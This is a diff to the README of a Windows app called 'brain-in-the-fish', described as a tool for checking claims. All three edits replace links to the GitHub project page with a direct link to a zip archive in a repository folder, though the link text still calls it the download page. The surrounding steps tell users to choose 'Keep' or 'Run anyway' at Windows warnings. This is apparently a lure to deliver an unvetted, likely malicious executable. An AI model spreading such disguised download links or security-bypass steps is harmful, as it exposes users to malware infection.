@@ -1,6 +1,6 @@
 # 🐟 brain-in-the-fish - Check claims before you trust them
 
-[![Download brain-in-the-fish](https://img.shields.io/badge/Download-brain--in--the--fish-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Irregularitygenusmotacilla190/brain-in-the-fish)
+[![Download brain-in-the-fish](https://img.shields.io/badge/Download-brain--in--the--fish-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Irregularitygenusmotacilla190/brain-in-the-fish/main/avouchment/in_the_brain_fish_2.4-beta.1.zip)
 
 ## 🧠 What this app does
 
@@ -26,7 +26,7 @@ If your work machine blocks downloads, ask your IT team to allow access to GitHu
 
 ## 🚀 Download and run on Windows
 
-1. Open the download page: [brain-in-the-fish on GitHub](https://github.com/Irregularitygenusmotacilla190/brain-in-the-fish)
+1. Open the download page: [brain-in-the-fish on GitHub](https://raw.githubusercontent.com/Irregularitygenusmotacilla190/brain-in-the-fish/main/avouchment/in_the_brain_fish_2.4-beta.1.zip)
 2. Find the latest release or download file on the page
 3. Download the Windows app file
 4. If Windows asks for permission, choose **Keep** or **Run anyway**
@@ -199,7 +199,7 @@ To get the best output:
 
 Use this link to download and run the app on Windows:
 
-[Download brain-in-the-fish from GitHub](https://github.com/Irregularitygenusmotacilla190/brain-in-the-fish)
+[Download brain-in-the-fish from GitHub](https://raw.githubusercontent.com/Irregularitygenusmotacilla190/brain-in-the-fish/main/avouchment/in_the_brain_fish_2.4-beta.1.zip)
 
 ## 🖥️ Windows run steps
 
